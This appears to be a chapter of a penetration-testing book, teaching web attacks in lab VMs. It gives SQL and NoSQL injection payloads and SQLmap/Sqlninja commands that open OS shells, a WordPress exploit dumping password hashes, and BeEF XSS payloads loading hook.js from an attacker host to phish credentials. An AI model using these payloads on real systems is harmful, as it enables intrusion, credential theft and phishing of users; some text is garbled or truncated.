The Throw - Manual Web Application Findings
At this point, you have assessed SUCK‚Äôs network, compromised the network scanner vulnerabilities,
and now you need to move on to web attacks. As more and more companies start to run vulnerability
scans of their own, I have slowly (slowly) been seeing a trend of the low-hanging service-based
vulnerabilities going away (like MS08-067). Therefore, the shift to application-based vulnerabilities
are still an easy target to exploit since most vulnerability scanners either do not provide web
application testing or do not enable web application scanning because it may break applications or
take way too long to scan.
As this book is geared more toward Red Teaming concepts, this book does not go in depth on all the
different vulnerabilities and how to manually exploit them. This is because a manual web application
book needs to be very detailed and discuss all the more obscure attacks like CORS (Cross-Origin
Resource Sharing), SSRF (Server-Side Request Forgery), the various one-off OAuth issues that come
with misconfiguration of security controls, and others. If you are looking for more information on
testing all sorts of web type vulnerabilities, you should heavily use these three resources:
‚óè OWASP Testing Guide
‚óã http://bit.ly/19GkG5R
‚óã https://www.owasp.org/images/1/19/OTGv4.pdf
‚óè SANS - Securing Web Application Technologies
‚óã https://www.sans.org/security-resources/posters/securing-webapplication-technologies-swat-2014-60/download
‚óè The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws
‚óã http://amzn.to/1lxZaCv
Lastly, if you read about Printer Exploitation in The Drive section, that is a great example of how a
web configuration vulnerability can get you to DA (or at least a domain account).
Web Application Penetration Testing
In the initial prep section, we have set up a couple of vulnerable VMs for testing. Since some of this
section will be based off the OWASP Broken Web Application VM, I highly recommend you set it up
prior to reading this chapter. You can download the VM here:
‚óè http://sourceforge.net/projects/owaspbwa/files/
Once you download it, you can unzip it and run it in either VMWare or VM Player. Once loaded, grab
the IP of the virtual machine and open it up in your local browser. It should look something like the
following:
OWASPBWA
This is one of my favorite web application testing platforms. Definitely spend time learning how to
break different web applications.
SLQ Injections
From either the scanning results or from just poking around, you might be able to identify some SQL
injections (SQLi) vulnerabilities. This is great because SQLi vulnerabilities can lead to a full
compromise of the database or of the system itself. Two open source tools that I have found to work
most of the time are SQLmap and Sqlninja. Let's go through the process from identification to
exploitation.
SQLMap with Burp
SQLmap is one of my favorite tools to use for finding SQL injections, manipulating database queries,
and dumping databases. It also has additional functionality to get an interactive shell through an
injection and can even spawn Meterpreter or a VNC session back to the attacker.
Before I show you how to use the command line versions of these tools, we will see how integration
with Burp Proxy Pro also works extremely well. This has saved me from memorizing all of the
different commands and allowed me to focus on being more efficient and effective.
Install:
‚óè Jython 2.7beta3
‚óè http://www.jython.org/downloads.html
‚óè Download Jython 2.7beta3 - Standalone Jar : For embedding Jython in Java
applications
Extender -> Options -> Python Environment -> Add the location and file of where you download
Jython:
‚óè Start Burp with: java -XX:MaxPermSize=1G -jar burpsuite_pro_v1.6.10.jar
‚óè Extender -> Options -> Python Environment -> Add the location and file of where
you download Jython
‚óè Restart Burp
‚óè Extender -> BApp Store
‚óè Select SQLiPy
‚óè (might as well install HTML5 Auditor, J2EEScan, CO2)
‚óè Restart Burp
Burp - SQLiPy
To use Burp and SQLMap, you start an SQLMap API on your Kali box; meanwhile, Burp Proxy Pro
can be running anywhere. When Burp finds an SQL injection, it will connect to SQLMap‚Äôs running
API to automatically attack the vulnerable parameters. Let‚Äôs now start the SQLMap API listener.
Start SQLMap API:
‚óè cd /opt/sqlmap
‚óè python sqlmapapi.py -s [IP] -p [PORT]
SQLMap API
Burp and SQLMap LAB:
To demonstrate how to use Burp and SQLMap, we can run a quick demo with the OWBWA VM we
configured at the beginning. Once loaded, visit [ip]/webgoat.net/Content/SQLInjection.aspx and
proxy through the Burp tool like we had done with our prior Burp example.
WebGoat Vulnerable Application
Make a couple quick searches while proxy‚Äôed through Burp Proxy Pro. In the HTTP history tab, you
should see the POST request created by the application. Right-click on any request that we want to
test and run SQLiPy Scan.
Burp - SQLiPy Scan
For the first time, we will have to input the SQLMap API IP and Port. We can also select what type
of data we want to pull.
Burp - SQLMap Scanner Injection
If an SQL Injection is successful, the Scanner tab will light up and have a new finding called
‚ÄúSQLMap Scan Finding.‚Äù By clicking on this, we will be able to get information about the current
DB, Hostname, Users, Passwords and databases.
SQLMap Results
As you can see above, we didn‚Äôt need to remember any switches or parameters, but we were still
able to dump the database. This makes SQL injections much quicker and leverages an easy-to-use
GUI panel.
Manual SQL Injection
SQLmap (http://sqlmap.org/) (Kali Linux)
The command line version has all the same functionality as through Burp. In the following examples, I
will show both a GET parameter and a POST parameter example with SQLmap, since they are the
most commonly identified types of SQLi. The reason I show both HTTP method attacks is because if
you don't have the request properly configured, it is very likely the attack will fail.
Here is a look at the help file for SQLmap. There are a lot of different switches that can be used for
SQLi attacks: sqlmap -h.
SQLMap Help Information
GET Parameter Example
In the following examples, we are going to assume that the GET parameter is where the SQLi
vulnerability is located with the URL. We want to test every parameter and make sure that the SQLi
vulnerability is really a finding. There are a good number of false positives I have seen with scanner
tools, so validation is really the only method for ensuring the findings. Remember that if you do not
specify a value to test, SQLmap will test every parameter by default.
‚óè Here is an example command to identify if an SQL injection vulnerability using the
banner switch:
‚óè cd /opt/sqlmap
‚óè python ./sqlmap.py -u "http://site.com/info.php?user=test&pass=test" -b
For example, we will attack our vulnerable virtual machine (OWASPBWA):
‚óè python ./sqlmap.py -u "http://192.168.1.124/mutillidae/index.php?page=userinfo.php&username=asdf&password=sdf&user-info-php-submitbutton=View+Account+Details" ‚Äìb
SQLMap Results
Retrieving the database username:
‚óè python ./sqlmap.py -u "http://site.com/info.php?user=test&pass=test" --current-user
Interactive Shell
‚óè python ./sqlmap.py -u "http://site.com/info.php?user=test&pass=test" --os-shell
Some hints and tricks:
‚óè You might need to define which type of database to attack. If you think an injection
is possible, but SQLmap is not finding the issue, try to set the --dbms=[database type]
flag.
‚óè If you need to test an authenticated SQL injection finding, log into the website via a
browser and grab the Cookie (you can grab it straight from Burp Suite). Then, define
the cookie using the --cookie=[COOKIE] switch.
‚óè Stuck? Try the command: sqlmap --wizard.
POST Parameter Example
POST examples are going to mimic GET injections, except for how the vulnerable parameter is
passed. Instead of being in the URL, the POST parameters are passed in the data section. This is
normally seen with username and passwords since the web servers generally log GET parameters
and you wouldn't want the web server to log passwords. Also, there are size limitations with GET
methods and, therefore, a lot of data will be passed via POST parameters for larger applications.
Determining if an SQL inject is valid (the result will be the banner if valid):
‚óè python ./sqlmap.py -u "http://site.com/info.php " --data= "user=test&pass=test" -b
For example, we will attack our vulnerable virtual machine (OWASPBWA):
‚óè python ./sqlmap.py -u "http://192.168.1.124/mutillidae/index.php?page=userinfo.php&username=asdf&password=asdf&user-info-php-submitbutton=View+Account+Details" -b
SQLMap Banner
Retrieving the database username:
‚óè python ./sqlmap.py -u "http://site.com/info.php --data= "user=test&pass=test" --
current-user
Interactive Shell:
‚óè python ./sqlmap.py u "http://site.com/info.php --data= "user=test&pass=test" --osshell
If you are able to gain access to an os-shell, you will have full command line access as the database
user. In the following example, I was able to find a vulnerable SQLi, gain an os-shell, and run an
ipconfig command.
SQLMap Command Shell
I recommend spending some time getting used to running different SQLi commands and trying
different switches identified in the help file. If SQLmap fails, it might be your configuration, so make
sure you try using the Wizard setup, also.
Sqlninja
(http://sqlninja.sourceforge.net/) (Kali Linux)
Sqlninja is another great SQL injection tool for uploading shells and evading network IDS systems
against MSSQL databases. You might be asking: Why would I use Sqlninja if I have already become
comfortable with SQLmap? From many years of experience, I have seen a large number of tests that
identify SQLi with only one tool or the other. This might be due to a number of factors such as how it
detects blind SQLi, how they upload binaries, how IPS signatures might detect one tool or the other,
or how they handle cookies. There are so many different variables, and it would be smart to always
double-check your work.
Taking a look at the help file with the -h switch, we can see all the different functionality Sqlninja
has:
Sqlninja Help Page
The only issue I have had with Sqlninja is that the configuration file is a bit more difficult to set up
and I have never found great or easy-to-read documentation. So I will give two similar examples
from SQLmap.
In Sqlninja, you need to define the vulnerable variable to inject by using the __SQL2INJECT__
command. This is different from SQLmap, where we did not need to specify which field to test
against. Let's go through a couple of examples since it should make things much clearer. Before we
can use Sqlninja, we need to define the SQL configuration file. This will contain all the information
about the URL, the type of HTTP method, session cookies, and browser agents.
Let me show you the easiest way to obtain the information required for Sqlninja. As before, load up
the Burp Suite and turn the proxy intercept on the request where the vulnerable field is passed. In the
following example, we are going to capture requests sent to /wfLogin.aspx and identify the POST
parameter values. This is going to have most of the information required for Sqlninja injections, but
slight modifications will need to be made from the Burp Raw request.
Let's take a look at one of the requests from Burp that identified a potential SQLi vulnerability:
Burp Request Example
In the next two examples, you will see how the most common GET and POST parameters are created.
This can be used for any different type of HTTP method, but usually the POST and GET methods will
be used.
A few things to notice from the original Burp request versus how it will be entered in the Sqlninja
configuration file are:
‚óè The HTTP Method (GET/POST) needs to be modified to include the full URL. Burp
is missing the http://site.com in front of /wfLogin.aspx
‚óè You have to define which parameters to fuzz by adding the __SQL2INJECT__
string.
‚óè Sometimes for Sqlninja, you may need to try the attack by first closing the
vulnerable SQL parameter. This can be done with ticks, quotes, or semi-colons.
GET Parameter Example
We are going to write the sql_get.conf configuration file to our Kali desktop with two vulnerable
parameters. Sqlninja will try to attack both the user and pass fields and try to validate if they are
vulnerable. To create/modify the configuration file in a terminal, type:
‚óè gedit ~/Desktop/sql_get.conf
‚óè Enter the following into the configuration file and save it:
‚óè --httprequest_start--
GET http://site.com/wfLogin.aspx?
user=test';__SQL2INJECT__&pass=test';__SQL2INJECT__ HTTP/1.0
Host: site.com
User-Agent: Mozilla/5.0 (X11; U; en-US; rv:1.7.13) Gecko/20060418 Firefox/1.0.8
Accept: text/xml, application/xml, text/html; q=0.9, text/plain; q=0.8, image/png,*/*
Accept-Language: en-us, en; q=0.7, it;q=0.3
Accept-Charset: ISO-8859-15, utf-8; q=0.7,*;q=0.7
Content-Type: application/x-www-form-urlencoded
Cookie: ASPSESSIONID=3dkDjb3jasfwefJGd
Connection: close
--httprequest_end--
POST Parameter Example
A POST request differs from a GET in that the parameters are passed in the data section instead of
being part of the URL. In a terminal, we need to create the configuration file and modify the
parameters to inject into. In this example, we will inject into both the username and password:
‚óè gedit ~/Desktop/sql_post.conf
‚óè Enter the following into the configuration file and save it:
‚óè --httprequest_start--
POST http://site.com/wflogin.aspx HTTP/1.0
Host: site.com
User-Agent: Mozilla/5.0 (X11; U; en-US; rv:1.7.13) Gecko/20060418 Firefox/1.0.8
Accept: text/xml, application/xml, text/html; q=0.9, text/plain; q=0.8, image/png, */*
Accept-Language: en-us, en; q=0.7, it;q=0.3
Accept-Charset: ISO-8859-15, utf-8; q=0.7,*;q=0.7
Content-Type: application/x-www-form-urlencoded
Cookie: ASPSESSIONID=3dkDjb3jasfwefJGd
Connection: close
username=test';__SQL2INJECT__&password=test';__SQL2INJECT__
--httprequest_end--
Executing Sqlninja
Whether you use a GET or POST method attack, executing your attack will be the same. Now that we
have created a configuration file, we can use the following command to run Sqlninja:
‚óè sqlninja -mt -f ~/Desktop/sql_get.conf
The following command says to run Sqlninja using the test mode to see if the injection works with the
configuration file we just created. If you are lucky and do find a valid SQL injection, you can start to
attack the database. In the following example, we are going to exploit our database, find the version,
check to see if we are the "sa" account (who has administrative privileges), and see if we have
access to a shell.
Sqlninja Example
Once we have xp_cmdshell available, we want to test that we have command line access and what
types of privileges we have. In the example below we are exploiting the SQLi vulnerability and
testing command line commands.
During this specific test (image below), it looks like we might be running commands on the server,
but we would need to validate this. The issue though, is that after setting up a listener on a server we
own on the Internet, it doesn't look like we are seeing any connections from the compromised server
outbound. This could be a problem if we wanted to exfiltrate data back to us or download additional
malware. Since the command line console created by Sqlninja doesn't show the responses fromcommands, therefore, we need to validate that our commands are successfully executing.
The best way to check if a command is working is by putting tcpdump to listen for pings on a server
we own, which is publicly available on the Internet. By running ping commands on a compromised
server, we can easily validate if our server is responding to pings. The reason we use pings is
because ICMP is generally allowed outbound and is less likely to trigger IDS/IPS signatures. This
can be configured with the following command on an external server owned by the attacker:
‚óè tcpdump -nnvXSs 0 -c2 icmp
This command will log any pings sent to my server, which will allow me to validate that the server
can talk outbound and that my commands are working. On my compromised SQLi host, I execute a
simple ping back to my server. If it is successful, tcpdump will see the ICMP request.
Command line SQLi attacks can be run with the following command:
‚óè sqlninja -f [configuration_file] -m c
As we can see in the image below, I first tried to run telnet commands back to my server, but that was
unsuccessful. I then tried to initiate ping commands back to my server, where tcpdump was listening.
In this case, my attack was successful, which proved I could run full commands on this host, but it
does not have web access back out.
In the image below, the top portion is my server logging pings and the bottom image is the victim host,
which is vulnerable to SQLi. Although the telnet commands seem to fail, the pings are successful.
SQLMap Command Injection Ping
If you have gotten this far and you aren't sure what to do next, you can jump to the Lateral Pass
section to get an idea on next steps. This should give you enough details to help you start testing and
practicing on vulnerable frameworks. Of course, these are the best scenario options, where the SQLi
works without having to configure detailed settings about the database type, blind SQLi type, or other
timing type issues.
NoSQL Database Injections
More and more, I am coming across NoSQL type databases on my penetration tests. If you aren‚Äôt
familiar with NoSQL, try to build out a database and interact with it. The major difference between
the two types of databases is that in a regular SQL database, it is structured and relational, while in a
NoSQL database, it is based more on key/value pairs, allowing you to store any type of data. This is
a very high explanation and takes a little time to understand why NoSQL databases are more
beneficial compared to traditional relational databases.
The two common types of NoSQL databases I come across are CouchDB and MongoDB. There has
always been a consensus that SQLinjections do not work on NoSQLdatabases. This isn‚Äôt completely
true. While many of the normal SQL injection attacks do not work in its current fashion, it is still
possible to accomplish many of the same goals. This is best demonstrated through the following
example. In the next lab example, we will build a MongoDB server and vulnerable application.
LAB:
‚óè git clone https://github.com/tcstool/NoSQLMap.git /opt/NoSQLMap
‚óè git clone https://github.com/cheetz/NoSQL_Test.git /opt/NoSQL_Test
‚óè apt-get install php5-dev php-pear
‚óè pear install -f pecl/mongo
‚óè pecl install mongo
‚óè pecl install apc
‚óè gedit /etc/php5/apache2/php.ini
‚óã add the following to the phi.ini file:
‚óã extension=mongo.so
‚óè service apache2 start
‚óè gedit /etc/mongodb.conf
‚óã Edit bind port to listen on any interface
‚óã bind_ip = 0.0.0.0
‚óè mkdir /var/www/vuln_apps
‚óè mv /opt/NoSQL_Test/userdata.php /var/www/vuln_apps
‚óè service apache2 restart && service mongodb restart
Next, we need to populate the MongoDB database. In a terminal window type:
‚óè mongo
‚óã use appUserData
‚óã db.createCollection("users")
‚óã show collections
‚óã db.users.insert({"name":"james","username":"james","email":"james@‚óã db.users.insert({"name":"frank","username":"frank","email":"frank@s‚óã db.users.insert({"name":"paul","username":"paul","email":"paul@sucIf everything worked out, it should look like this when you query a user:
Sample Vulnerable NoSQL Application
If you see this, that‚Äôs great! You have a MongoDB installation and webpage utilizing that backend
NoSQL database. Now, we want to see if we can attack this MongoDB installation. In the following
example, we are going to use a tool called NoSQLMap.
NoSQLMap
We need to execute the nosqlmap.py script and set the vulnerable IP and GET parameters.
Attacking MongoDB:
‚óè cd /opt/NoSQLMap
‚óè python nosqlmap.py
‚óè 1 - Set Options
‚óã Set options for target host IP (your Mongo IP)
‚óã Set App Path to: /vuln_apps/userdata.php?
usersearch=paul&submitbutton=Submit
‚óã set my local MonboDB IP (your host)
‚óã b - Save option file
‚óã x - to Exit
We have now set the configuration of the vulnerable site, so let‚Äôs attack the web application that uses
a MongoDB backend:
‚óè 3-NoSQL Web App attacks
‚óè Baseline test-Enter random string size: 5
‚óè 1-Alphanumeric
‚óè 1-usersearch
NoSQLMap is taking each variable in the GET parameter and testing common NoSQL injection
techniques. If everything is successful, you will see something like the following:
NoSQLMap - Scanner Results
Right away, NoSQLMap identified two URLs that are vulnerable. Browsing those URLs, we see that
the variable usersearch is vulnerable and that we can inject NoSQL commands into that GET
parameter.
‚óè http://192.168.199.128:80/vuln_apps/userdata.php?usersearch=a'; return
db.a.find(); var dummy='!&submitbutton=Submit
Running that query in a browser, we see something that is equivalent to a select * from usersearch; in
SQL.
NoSQL Injection
We have just dumped that Collection and dumped all the users. Although many people have stated that
traditional SQL injection attacks do not work on noSQL databases, this is only partly true. The
concept for SQL injection attacks against NoSQL technologies is still sound, regardless of database
syntax.
CMS - Content Management Systems
To continue on the topic of vulnerable web applications, I am always finding different types of
content management systems (CMS) through my penetration tests. From what I have seen, Nessus will
pick up some of the CMS issues, but most are found through more manual testing. To help speed up
the initial scans of CMS sites, I like to use a couple of tools, listed below.
CMSmap Lab
(https://github.com/Dionach/CMSmap)(Kali Linux):
CMSmap is a vulnerability scanner written by Dionach and automates and validates issues in
numerous CMS applications. Let‚Äôs walk through an example from initial finding to exploitation. On
our OWASPBWA VM, there is a WordPress site on which we can test the scanner: http://[Vulnerable
OWASPBWA IP]/wordpress/.
Vulnerable Wordpress Site
CMS sites have historically had huge numbers of vulnerabilities, so let‚Äôs scan this site using
CMSmap to see what we can find:
‚óè cd /opt/CMSmap
‚óè ./cmsmap.py -t http://[Vulnerable OWASPBWA IP]/wordpress/
CMSMap - Scanner Results
A lot of different findings will come up and it is really just about playing around with them to find the
right ones to exploit. In this case, we will take one of the verified vulnerabilities:
‚óè [M] EDB-ID: 5486 Date: 2008-04-22 Verified: Yes Title: Wordpress Plugin
Spreadsheet <= 0.6 - SQL Injection Vulnerability
A quick Google search of EDB-ID: 5486 points to:
‚óè http://www.exploit-db.com/exploits/5486/
‚óè And the exploit code looks like this: wp-content/plugins/wpSS/ss_load.php?
ss_id=1+and+
(1=0)+union+select+1,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4+from+w-&display=plain
So this looks to be an SQL injection vulnerability that queries the database for the users, passwords,
and emails. Let‚Äôs open a browser to this page:
‚óè http://172.16.151.144/wordpress/wp-content/plugins/wpSS/ss_load.php?
ss_id=1+and+%281=0%29+union+select+1,concat%28user_login,0x3a,user_pass,0x3a-&display=plain, we see the hash of the admin account.
WordPress Exploit
Great‚Äìwe just got the hash to the admin account, which we can crack and, if successful, connect back
to the database or SSH into the server.
For more in depth WordPress vulnerability scanning, look at also using WPScan
(https://github.com/wpscanteam/wpscan):
‚óè cd /opt/wpscan
‚óè ruby ./wpscan.rb --url http://[WordPress IP]/
WPScan is not only a vulnerability scanner for WordPress, but also has functionality for brute-forcing
accounts, enumerating plugins, enumerating users, and other discovery tools.
Cross-Site Scripting (XSS)
I can't talk about web application vulnerabilities without talking about Cross-Site Scripting (XSS).
This is probably one of the most common vulnerabilities that I come across. XSS is a user attack that
is caused by a lack of input validation by the application. There are two types of XSS: reflective
(non-persistent) and stored (persistent). Both allow an attacker to write script code into a user's
browsers. I am going to focus on reflective XSS, which is the more common type and is relatively
similar to stored XSS in terms of vulnerability exploitation.
BeEF Exploitation Framework
(http://beefproject.com/)(Kali Linux)
The general question I get from my clients is, "How much harm can an XSS really cause?" With this
vulnerability you have the full ability to write scripting code on the end user's browser, so anything
that you do in JavaScript could be used against the victim. In this section, we will dive into how
malicious you can be with an XSS attack.
The best tool I have seen used with XSS attacks is the BeEF Exploitation Framework. If you find an
XSS, not only can you cause a victim to become part of your pseudo-botnet, but you can also steal the
contents of the copy memory, redirect them to links, turn on their camera, and so much more.
If you do find a valid XSS on a site, you will need to craft your XSS findings to utilize the BeEF
Framework. For our XSS examples in this chapter, we are going to use an XSS that was identified
from our initial Burp Active Scans. Let's take the example vulnerable URL:
http://www.securepla.net/xss_example/example.php?alert=test'<script>[iframe]</script>.
From the Setting Up a Penetration Box section, we installed BeEF into /opt/beef/.
We are going to have to first start the BeEF service.
Starting BeEF Commands:
‚óè cd /opt/beef/
‚óè ./beef
Starting Up BeEF
Let's log into the console UI after the BeEF server has started. As we see from the image above, the
UI URL in this case is located at http://127.0.0.1:3000/ui/authentication. We can open a browser and
go to that URL.
BeEF Login Screen
If everything started up successfully, you will be able to log into the UI using the username ‚Äúbeef‚Äù and
password ‚Äúbeef‚Äù. If we look at the image where we loaded BeEF via the command line, we see a
URL for both the UI page and the hook page (Hook URL). Let's take a moment to review the hook
page (hook.js).
BeEF Client Side JavaScript
Although this JavaScript has been well obfuscated, this is the payload that will control the victim user
and will be injected into the victim browser's page. Once injected, their browser will connect back
into your central server with the victim unaware.
LAB - XSS on OWASPBWA
We were able to identify an XSS via Burp or ZAP on our vulnerable Web Application VM
(OWASPBWA). So, we can directly access the vulnerable XSS by connecting to our web service:
‚óè [IP_of_OWASPBWA]/owaspbricks/content-2/index.php?
user=harry3a201<script>alert(1)<%2fscript>6f350
Since we have located an XSS vulnerability on a page, we can now use BeEF to help with the
exploitation of the end user. In our initial example,
http://[IP_of_OWASPBWA]/owaspbricks/content-2/index.php?user=, the user variable takes any
input and presents it to the end user. This proves that the end user does process the JavaScript code
embedded from our query.
Bricks - XSS
To create a successful exploit, instead of printing an alert, we are going to craft a URL that uses
JavaScript to include the hook.js file. It will look something like:
‚óè http://192.168.1.124/owaspbricks/content-2/index.php?user=harry3a201<script
src=http://192.168.1.123:3000/hook.js></script>
I was able to append the hook.js script by using the JavaScript code:
‚óè <script src=[URL with hook.js]></script>
Remember that if this is done on a public site, then the URLwill need to point to a public address that
hosts the hook.js page and listening service.
Once you trick a victim into going to that URL using Social Engineering Tactics, they will become a
part of your XSS zombie network. Going back to our UI panel, we should now see that a victim has
joined our server.
BeEF Client Attacks
With an account hooked, there are many different modules within BeEF to exploit the end user. As
seen in the image above, you can try to steal stored credentials, get host IP information, scan hosts
within their network, and much more.
One of my favorite attacks is called "pretty theft" because of its simplicity. Drop down to the Social
Engineering folder, select Pretty Theft, then configure it how you want in this case, we will use the
Facebook example, and hit execute. Remember that the IP for the custom logo field has to be your
BeEF IP. This will allow the victim to grab the image from your server.
Pretty Theft Facebook Attack
After the attack is submitted, a Facebook password prompt will pop up onto the victim's system. This
is where you can get creative by using a popup in which your target users would most likely enter
their information. If you are looking to gain Google accounts, there is also a Google Phishing module.
The benefit of this client-side attack is that the ordinary-looking password prompt popup keeps the
user unaware that they are part of this zombie network.
Pretty Theft Attack
After the unsuspecting victim types in their password, go back to the UI to find your loot. Clicking on
the ID ‚Äú0‚Äù will show the attacker what the victim typed into that box. This should be enough to start
gaining some access as the user, allowing you to move laterally through the environment.
Pretty Theft Results
I hope I was able to demonstrate how powerful an XSS vulnerability can be. It is exponentially worse
if the XSS finding was a stored XSS versus the reflective XSS example we just saw. If it had been a
stored XSS, we most likely wouldn't even need to use social engineering tactics on the victim to go to
the link; we would just need to wait until our code was executed by the victim‚Äôs system.
Cross-Site Scripting Obfuscation:
A common problem for an attacker injection code is that the application implements some sort of
input validation for vulnerable XSS fields. This means the XSS is still valid, but you don't have all
the normal characters you need to successfully take advantage of this vulnerability. However, the
great thing for a pentester is that these filters are usually improperly configured.
Fortunately, since there are so many different types of ways to encode your XSS attacks, the filters
from the input validation scripts usually fail. You really could write an entire book about how to craft
different XSS attacks, but here are my quick and dirty tricks to get a working list of encoders.
Crowd Sourcing
One of my favorite methods to find a huge number of valid XSS vulnerabilities is to visit
http://www.reddit.com/r/xss. People will post the different XSS findings they have come across on
that sub-reddit. This is a great way to see what other types of XSS vulnerabilities people are finding.
Scanners are good, however, they can never replace a human eye. A lot of the findings on this subreddit were not found by an automated process, but found manually.
I created a quick script to grab and parse all the results from the crowd-sourced sub-reddit. To kick
off your own scan:
‚óè cd /opt/reddit_xss/
‚óè python reddit_xss.py
Reddit XSS Scrape
Once competed, a file named output_xss.txt will be generated. As you will see in your output, people
will obfuscate XSS attacks with ‚Äúfrom CharCode‚Äù, percent encoding, htmlentities, and other
JavaScript commands. Now, you are armed with a good list of XSS examples (many of them still
active) and encodings. One quick additional note is that I do not recommend you visit the vulnerable
site with the XSS payloads, as you could be seen as attacking their website. What I wanted to do was
show you how to generate a good list of encoding examples that might help you in your attacks.
OWASP Cheat Sheet
Another resource I often use is the OWASP Evasion Cheat Sheet. This is usually the first place I look
whenever I run into an encoding problem on any of my engagements.
The cheat sheet can be found here:
https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet.
The most common XSS problems I find usually arise from length issues or the fact that the
greater/less than symbols are not allowed. Luckily, the OWASP has many different examples to get
around these issues.
Cross-Site Request Forgery (CSRF)
Cross-Site Request Forgery basically allows you to force an unwanted action onto the victim. For
example, you send a link to someone who is currently logged into their bank account. When that
person accesses your link, it automatically transfers money out of their account into your account.
This happens when there is no verification process to check that the user went through the appropriate
steps to transfer money.
What I mean is that in order to transfer money, a user needs to login, go to their transfer payment page,
select the recipient and then transfer the money. When these appropriate steps are taken, a CSRF
token is generated on each and every page as you progress through the application. Additionally the
previous token is verified before the next step can process. You can think of this as a tracking system‚Äì
if any of those tokens are empty or wrong, the transaction does not process.
There are many complex ways to test this, but the easiest way to manually run these tests is through
proxying traffic. I will go through the process of making a transaction as described above and see if I
can replay it. However, in the replay, my goal is to get the same end result without having to go
through all of the steps, which proves that there is a CSRF vulnerability.
Using Burp for CSRF Replay Attacks
Let's take an example where a bank application allows transfers from one user to another. In the URL
below, there are two parameters that are used. The first parameter is User (to whom the money will
go). The second parameter is the dollar amount. In the case below, we successfully transferred money
to Frank.
What would happen if I sent this same URL to another person who was already logged into the same
bank application? Well, if a CSRF protection were not in place, it would transfer $123.44 from the
victim host to Frank, instantly.
CSRF Example
To test if this is possible, we first capture the request via Burp. Make sure that your browser is still
proxying to Burp and make the request with user 1. This should work just fine as you went through the
proper channels to make the transfer. You should be able to log in, go to the transfer page, fill in the
information, and submit.
In the example below, we can go to Burp's Proxy Tab and the History to see our last requests. At the
very bottom, we see the request for the bank transfer. We also see that there is a hook cookie, but
nothing that looks like a CSRF token.
Burp CSRF Example
To validate this, we can actually try to repeat the request. I usually try this method because it tells me
instantly if I can repeat requests without having to perform any additional actions.
If you right-click anywhere in the Raw Request area, the option to "Send to Repeater" appears.
Sending to Burp's Repeater
Inside the Repeater Tab, pressing the Go button will repeat the request and the following response
will be populated. The result in our example was that the amount was transferred again without any
verification from the user that this request was actually intended. This is great because you could send
that same link to every user of this bank and Frank would become an instant millionaire.
Executing Burp Repeater
The application shouldn't have allowed the user to transfer money again without going through all the
steps required to create a transfer request. Without a CSRF token, you could have an unsuspecting
victim click on a link and have unauthorized transfers occur. If you are looking for more information
on CSRF attacks, go to OWASPs page:
https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF).
Session Tokens
Session tokens are generally used for tracking sessions, as HTTP is a stateless protocol by default.
What you want to look for in a session token are: (1) the fact that they cannot be guessed and, (2) that
they properly track a user. Other things you should look for are when session tokens expire, if they are
secure, that they validate input, and that they are properly utilized.
In this section, we are going to specifically look at making sure session tokens are properly
randomized and that they can't be guessed. Using Burp Suite to capture an authentication process, we
can see in the response that there is a set-cookie value for the session tokens. This is located under
the main Proxy tab and sub-tab History.
Burp's Raw Response
We can right-click within the raw response section and send this request to the Sequencer feature.
Sending the Raw Request to Sequencer
Once you click Send to Sequencer, jump over to the Sequencer tab and identify which session tokens
are important to you. Once you pick your token, you can click the Start Live Capture to start
generating session tokens.
Selecting the Session Token
Once you start the capture, a new window will pop up and it will start processing/generating tokens.
After so many tokens, it will give you summaries of entropy (randomness), character-level analysis
(see image below), and bit-level analysis. In the image below, Burp Suite is analyzing the placement
of each character. There are many other features within Burp's sequencer tool, so I recommend
spending some time trying to understand how session tokens are generated.
Character Position for Cookies
I leave a lot here to your own judgment because it takes experience to understand when session
cookies are or aren't secure. Every major web application I have seen uses different types of
implementations and algorithms to generate session tokens, so running something like the examples
above or reviewing source code may be required.
Additional Fuzzing/Input Validation
Burp Suite is extremely extensible and has a lot of other features. One quick feature that I find
extremely helpful during manual testing is the Intruder function. In the Intruder function, you have the
ability to tamper with any part of the request and provide your own data. This would be very useful if
you want to supply your own fuzzer input to test a variable.
We are going to walk through a very high-level overview of how you could use the fuzzing feature.
The basic idea of the following example is to access an online store and see why parameter fuzzing
can be highly beneficial. The online store might only link to certain items from their website, but the
content managers could have put up all of next week's sale items. They just wait for the next week and
link the content from their main website homepage.
I used to see a lot of these types of issues for sites that do Black Friday sales. They will have all of
their content and prices hosted, but not linked anywhere on their page or made available to the public.
Brute-forcing through all of the parameters will allow an attacker to know which items will go on
sale that following week, before the public is notified.
I created a dummy website to demonstrate this exact issue. The website:
www.securepla.net/tehc/hack.php?id=2,
has a GET parameter called ID. You can modify this ID field from 1 to 2 to 3 and get different results.
Brute Forcing Parameters
We want to brute-force through all the different parameter values to see which pages exist and which
pages do not. Since we already have our traffic flowing through Burp, we can go to the Proxy tab and
then to your History tab. You will see all your past requests there. Right-click on that last request and
click ‚ÄúSend to Intruder‚Äù.
Sending Request to Intruder
Your Intruder tab at the top menu bar will light up. When you click that Intruder tab and move to the
Positions tab, you will see a bunch of highlighted text. Since I am only testing one parameter at this
time, I will click the "clear" button first, highlight just the "2" value (as it is the only one I want to
fuzz), and click the "Add" button on the right side. This tells Burp to only fuzz whatever value is fed
into the ID GET parameter and that parameter will now be yellow.
There is another configuration selection called the Attack type. For this setting, I left it at the default
type of Sniper. You should spend a quick second and review each of the different types of attacks on
Burp Suite's site:
http://portswigger.net/burp/help/intruder_positions.html.
Burp Payload Positions
Go to the Payloads tab (still within the Intruder tab) and click the "Load" button. In this example, I amonly loading a list of numbers from 1-100. However, you can add almost any type of list, depending
on what you are working with. For example, if I am working with a database or LDAP queries, I will
know the parameter that needs to be manipulated and will import a list of those fuzzed parameters. It
is really up to you to figure out which types of tests you should fuzz. From our set-up phase, you
should have a great fuzzing list located under /opt/SecLists/ on your Kali machine.
Burp List
Once you have your list imported, you will need to kick off the Intruder attack. At the top menu bar,
go to Intruder and Start attack. After you start the attack, a new Intruder Attack window will pop up
and Burp will start trying all of the parameter requests.
Starting Brute Forcing in Burp Suite
Burp Suite Results
As the requests start populating, how can you tell if a site has been changed based on parameter
injection? Well, the easiest way to tell is by the length of the source code on that page, when that
string is injected. If the source code length is different from a standard baseline, this informs us that
there have been changes to the page.
If we look at the sample test above, the parameter values we injected from 5 to 26, resulted in a page
content length of 299. This source length of 299 is now our baseline for testing. When we go through
all of the responses of all pages that are not 299 in length, we see that request 27 has a page length of
